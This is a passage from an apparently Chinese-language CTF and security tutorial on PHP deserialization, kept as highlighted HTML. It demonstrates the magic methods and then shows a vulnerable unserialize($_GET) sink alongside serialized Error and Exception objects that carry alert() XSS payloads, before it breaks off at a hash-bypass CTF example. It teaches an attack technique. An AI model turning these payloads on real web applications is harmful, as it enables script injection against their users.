    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"调用了一个不存在的方法\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'$name='</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'arguments='</span><span class=\"token operator\">.</span><span class=\"token variable\">$arguments</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token function\">demo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031210134723.png\" alt=\"image-20221031210134723\" /></p>\n<h3 id=\"__callstatic用静态方式调用一个不可调用方法时调用\"><a class=\"anchor\" href=\"#__callstatic用静态方式调用一个不可调用方法时调用\">#</a> __callStatic ()，用静态方式调用一个不可调用方法时调用</h3>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">此方法与上面所说的 __call() 功能除了 __callStatic() 是为静态方法准备的之外，其它都是一样的。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h3 id=\"__get获得一个类的私有成员变量的时候调用\"><a class=\"anchor\" href=\"#__get获得一个类的私有成员变量的时候调用\">#</a> __get ()，获得一个类的私有成员变量的时候调用</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$n</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'get$n'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$n</span></span>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">clown</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">test</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031211102996.png\" alt=\"image-20221031211102996\" /></p>\n<h3 id=\"__set设置一个类的成员变量的时候调用\"><a class=\"anchor\" href=\"#__set设置一个类的成员变量的时候调用\">#</a> __set，设置一个类的成员变量的时候调用</h3>\n<p>__set ($property, $value) 方法用来设置私有属性， 给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值，参数 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mtext>是要操作的变量名称，</mtext></mrow><annotation encoding=\"application/x-tex\">key 是要操作的变量名称，</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">要</span><span class=\"mord cjk_fallback\">操</span><span class=\"mord cjk_fallback\">作</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">称</span><span class=\"mord cjk_fallback\">，</span></span></span></span>value 为变量 $key 的值</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Setting <span class=\"token interpolation\"><span class=\"token variable\">$name</span></span> to <span class=\"token interpolation\"><span class=\"token variable\">$value</span></span>\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"clown\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">test</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"demo\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031211605290.png\" alt=\"image-20221031211605290\" /></p>\n<h3 id=\"__isset不可访问或者不存在属性调用isset或empty时调用\"><a class=\"anchor\" href=\"#__isset不可访问或者不存在属性调用isset或empty时调用\">#</a> __isset ()，不可访问或者不存在属性调用 isset () 或 empty () 时调用</h3>\n<p><pre class=\"line-numbers language-PHP\" data-language=\"PHP\"><code class=\"language-PHP\">&lt;?php\nerror_reporting(0);\nclass demo&#123;\n    public $clown&#x3D;&quot;joker&quot;;\n    private $test &#x3D; &quot;test&quot;;\n    function __isset($name)&#123;\n        echo &quot;isset-&gt;$name\\n&quot;;\n    &#125;\n&#125;\n$a&#x3D;new demo();\nisset($a-&gt;clown);\nisset($a-&gt;test);\necho serialize($a).&quot;\\n&quot;;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031211913408.png\" alt=\"image-20221031211913408\" /></p>\n<h3 id=\"__sleep序列化的时候优先调用\"><a class=\"anchor\" href=\"#__sleep序列化的时候优先调用\">#</a> __sleep ()，序列化的时候优先调用</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"sleeping\\n\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"clown\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031212220422.png\" alt=\"image-20221031212220422\" /></p>\n<h3 id=\"__wakeup反序列化的优先调用\"><a class=\"anchor\" href=\"#__wakeup反序列化的优先调用\">#</a> __wakeup ()，反序列化的优先调用</h3>\n<p><pre class=\"line-numbers language-PHP\" data-language=\"PHP\"><code class=\"language-PHP\">&lt;?php\nerror_reporting(0);\nclass demo&#123;\n    public $clown&#x3D;&quot;joker&quot;;\n    private $test &#x3D; &quot;test&quot;;\n    function __sleep()&#123;\n        echo &quot;sleeping\\n&quot;;\n        return array(&quot;clown&quot;);\n    &#125;\n    function __wakeup()&#123;\n        echo &quot;waking up\\n&quot;;\n    &#125;\n&#125;\n$a&#x3D;new demo();\n$B&#x3D;serialize($a);\nunserialize($B);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031212435068.png\" alt=\"image-20221031212435068\" /></p>\n<h3 id=\"__tostring类被当成字符串时自动调用\"><a class=\"anchor\" href=\"#__tostring类被当成字符串时自动调用\">#</a> __toString ()，类被当成字符串时自动调用</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'toString'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031212708429.png\" alt=\"image-20221031212708429\" /></p>\n<h3 id=\"__invoke当类被当作方法时自动调用\"><a class=\"anchor\" href=\"#__invoke当类被当作方法时自动调用\">#</a> __invoke ()，当类被当作方法时自动调用</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031212919336.png\" alt=\"image-20221031212919336\" /></p>\n<h3 id=\"__clone调用clone函数复制类调用\"><a class=\"anchor\" href=\"#__clone调用clone函数复制类调用\">#</a> __clone ()，调用 clone 函数复制类调用</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__clone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"cloned\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">clone</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031213057559.png\" alt=\"image-20221031213057559\" /></p>\n<h2 id=\"php原生类的使用\"><a class=\"anchor\" href=\"#php原生类的使用\">#</a> PHP 原生类的使用</h2>\n<p>既然是反序列化怎么可能会没有原生类的身影？</p>\n<p>php 原生类，顾名思义就是在标准 php 库中已经封装好的类，经常遇见的有：</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Error\nException\nSoapClient\nDirectoryIterator\nSimpleXMLElement<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h3 id=\"errorexception-xss\"><a class=\"anchor\" href=\"#errorexception-xss\">#</a> Error/Exception --XSS</h3>\n<p>Error 类用于 php7 和 php8 中开启保存</p>\n<p>Exceotion 类用于 php5、php7 和 php8 中开启报错</p>\n<h4 id=\"error\"><a class=\"anchor\" href=\"#error\">#</a> Error</h4>\n<p>Error 类是从 php7 开始引入的，是所有 php 报错的基类，为什么会和 xss 扯上关系呢？xss 常见的漏洞点在有输出的地方，而在 Error 类中有一个__toString () 魔术方法，当我们把对象当作字符串的时候就会自动调用（demo 可以看看上面），如果这里有个 echo 就可以触发 toString 将异常对象转化成字符串</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>payload：</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script>alert(/xss/)&lt;/script>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A37%3A%22C%3A%5CUsers%5C%E9%99%8C%E8%B7%AF%5CDesktop%5Cindex+%281%29.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A3%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031223216347.png\" alt=\"image-20221031223216347\" /></p>\n<h4 id=\"exception\"><a class=\"anchor\" href=\"#exception\">#</a> Exception</h4>\n<p>这里利用方式一样，适应的 php 版本更广</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script>alert(/xss/)&lt;/script>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>payload：</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script>alert(1)&lt;/script>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A37%3A%22C%3A%5CUsers%5C%E9%99%8C%E8%B7%AF%5CDesktop%5Cindex+%281%29.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031224036762.png\" alt=\"image-20221031224036762\" /></p>\n<h3 id=\"errorexception-绕过哈希\"><a class=\"anchor\" href=\"#errorexception-绕过哈希\">#</a> Error/Exception -- 绕过哈希</h3>\n<p>这里就得提到这两个原生类的属性</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">message-错误的消息内容\ncode-错误代码\nfile-抛出错误的文件名\nline-抛出错误的行数<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">===</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">/*\nbool (false)\nError: test in C:\\Users\\ 陌路 \\Desktop\\sheng.php:2\nStack trace:\n#0 &#123;main&#125;\nError: test in C:\\Users\\ 陌路 \\Desktop\\sheng.php:2\nStack trace:\n#0 &#123;main&#125;\n*/</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>这里<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mtext>和</mtext></mrow><annotation encoding=\"application/x-tex\">a和</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">和</span></span></span></span> b 不同但是，toString 返回结果相同</p>\n<p>这就不得不提到一道经典的例题</p>\n<p>[2020 极客大挑战] Greatphp</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">SYCLOVER</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> 